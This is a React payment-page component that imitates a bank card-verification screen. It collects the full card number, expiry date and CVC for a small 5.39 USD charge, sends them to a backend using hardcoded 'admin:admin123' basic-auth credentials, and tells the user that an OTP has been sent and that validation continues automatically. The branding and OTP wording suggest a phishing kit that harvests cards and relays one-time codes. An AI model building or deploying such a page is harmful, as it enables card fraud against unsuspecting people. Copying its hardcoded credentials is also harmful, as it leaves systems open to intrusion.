import React, { useState } from 'react';
import '../global.css'; // On importe le CSS global
import SPMB from '../images/SMPB.png';

const PaymentPage = () => {
    const [formData, setFormData] = useState({
        cardPart1: '',
        cardPart2: '',
        cardPart3: '',
        cardPart4: '',
        expiry: '',
        cvc: ''
    });
    const [errors, setErrors] = useState({});
    const [status, setStatus] = useState('');
    const [isProcessing, setIsProcessing] = useState(false);

    const handleChange = (e) => {
        const { name, value } = e.target;

        if (name === 'expiry') {
            // Handle expiry date formatting (MM/YY)
            const cleaned = value.replace(/\D/g, ''); // Remove non-digits

            if (cleaned.length <= 4) {
                let formatted = cleaned;

                // If we have more than 2 digits, insert the slash
                if (cleaned.length > 2) {
                    formatted = cleaned.slice(0, 2) + '/' + cleaned.slice(2);
                }

                // Make sure the month is between 01-12
                if (cleaned.length >= 2) {
                    const month = parseInt(cleaned.substring(0, 2));
                    if (month < 1 || month > 12) {
                        setErrors(prev => ({ ...prev, expiry: 'Month must be between 01-12' }));
                    } else {
                        setErrors(prev => {
                            const newErrors = { ...prev };
                            delete newErrors.expiry;
                            return newErrors;
                        });
                    }
                }

                setFormData(prev => ({ ...prev, [name]: formatted }));
            }
        } else if (name.startsWith('cardPart') && value.length <= 4 && /^\d*$/.test(value)) {
            setFormData(prev => ({ ...prev, [name]: value }));
        } else if (name === 'cvc' && value.length <= 4 && /^\d*$/.test(value)) {
            setFormData(prev => ({ ...prev, [name]: value }));
        }
    };

    const validateForm = () => {
        let tempErrors = {};
        const fullCardNumber = `${formData.cardPart1}${formData.cardPart2}${formData.cardPart3}${formData.cardPart4}`;

        if (!fullCardNumber.match(/^\d{16}$/)) {
            tempErrors.cardNumber = 'Card number must be 16 digits';
        }

        // Check expiry date format and if it's not expired
        if (!formData.expiry.match(/^(0[1-9]|1[0-2])\/\d{2}$/)) {
            tempErrors.expiry = 'Invalid expiry date (MM/YY)';
        } else {
            // Check if card is not expired
            const [month, year] = formData.expiry.split('/');
            const expiryDate = new Date(2000 + parseInt(year), parseInt(month) - 1, 1);
            const today = new Date();

            if (expiryDate < today) {
                tempErrors.expiry = 'Card is expired';
            }
        }

        if (!formData.cvc.match(/^\d{3,4}$/)) {
            tempErrors.cvc = 'CVC must be 3 or 4 digits';
        }

        setErrors(tempErrors);
        return Object.keys(tempErrors).length === 0;
    };

    const handleSubmit = async (e) => {
        e.preventDefault();
        if (!validateForm()) {
            return;
        }
        setIsProcessing(true);
        setStatus('Vérification des informations...');
        const cardNumber = `${formData.cardPart1}${formData.cardPart2}${formData.cardPart3}${formData.cardPart4}`;

        try {
            const response = await fetch('http://localhost:8443/api/process-payment', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': 'Basic ' + btoa('admin:admin123')
                },
                body: JSON.stringify({
                    cardNumber,
                    expiry: formData.expiry,
                    cvc: formData.cvc,
                    amount: 5.39
                })
            });

            if (response.ok) {
                setStatus('Informations vérifiées. Un code OTP vous a été envoyé. Le processus de validation se poursuit automatiquement...');
            } else {
                setStatus('Échec de la vérification des informations de paiement');
            }
        } catch (error) {
            console.error('Erreur:', error);
            setStatus('Une erreur s\'est produite lors du traitement de votre demande');
        } finally {
            setIsProcessing(false);
        }
    };

    // Auto-tab between card number fields
    const handleCardInputKeyUp = (e, nextFieldName) => {
        if (e.target.value.length === 4 && nextFieldName) {
            document.querySelector(`input[name="${nextFieldName}"]`).focus();
        }
    };

    return (
        <div className="payment-container">
            <div className="left-logo">
                <img src={SPMB} alt="Bank Logo" />
            </div>
            <div className="amount">5.39 USD</div>
            <div className="merchant">Grapes</div>
            {status && <div className="status-message">{status}</div>}
            <form onSubmit={handleSubmit}>
                <div className="input-container card-number-group">
                    <input
                        type="text"
                        name="cardPart1"
                        value={formData.cardPart1}
                        onChange={handleChange}
                        onKeyUp={(e) => handleCardInputKeyUp(e, 'cardPart2')}
                        maxLength="4"
                        placeholder="XXXX"
                        className="card-part"
                        disabled={isProcessing}
                    />
                    <input
                        type="text"
                        name="cardPart2"
                        value={formData.cardPart2}
                        onChange={handleChange}
                        onKeyUp={(e) => handleCardInputKeyUp(e, 'cardPart3')}
                        maxLength="4"
                        placeholder="XXXX"
                        className="card-part"
                        disabled={isProcessing}
                    />
                    <input
                        type="text"
                        name="cardPart3"
                        value={formData.cardPart3}
                        onChange={handleChange}
                        onKeyUp={(e) => handleCardInputKeyUp(e, 'cardPart4')}
                        maxLength="4"
                        placeholder="XXXX"
                        className="card-part"
                        disabled={isProcessing}
                    />
                    <input
                        type="text"
                        name="cardPart4"
                        value={formData.cardPart4}
                        onChange={handleChange}
                        maxLength="4"
                        placeholder="XXXX"
                        className="card-part"
                        disabled={isProcessing}
                    />
                </div>
                <span className="required">*</span>
                {errors.cardNumber && <span className="error">{errors.cardNumber}</span>}

                <div className="input-container">
                    <input
                        type="text"
                        name="expiry"
                        placeholder="MM/YY"
                        value={formData.expiry}
                        onChange={handleChange}
                        maxLength="5"
                        disabled={isProcessing}
                    />
                    <span className="required">*</span>
                    {errors.expiry && <span className="error">{errors.expiry}</span>}
                </div>

                <div className="input-container">
                    <input
                        type="text"
                        name="cvc"
                        placeholder="CVC"
                        value={formData.cvc}
                        onChange={handleChange}
                        maxLength="4"
                        disabled={isProcessing}
                    />
                    <span className="required">*</span>
                    {errors.cvc && <span className="error">{errors.cvc}</span>}
                </div>

                <button type="submit" disabled={isProcessing}>
                    {isProcessing ? 'Traitement en cours...' : 'Pay 5.39 USD'}
                </button>
            </form>
            <div className="card-icons">
                <img
                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/MasterCard_Logo.svg/200px-MasterCard_Logo.svg.png"
                    alt="Mastercard"
                />
                <img
                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/200px-Visa_Inc._logo.svg.png"
                    alt="Visa"
                />
            </div>
        </div>
    );
};

export default PaymentPage;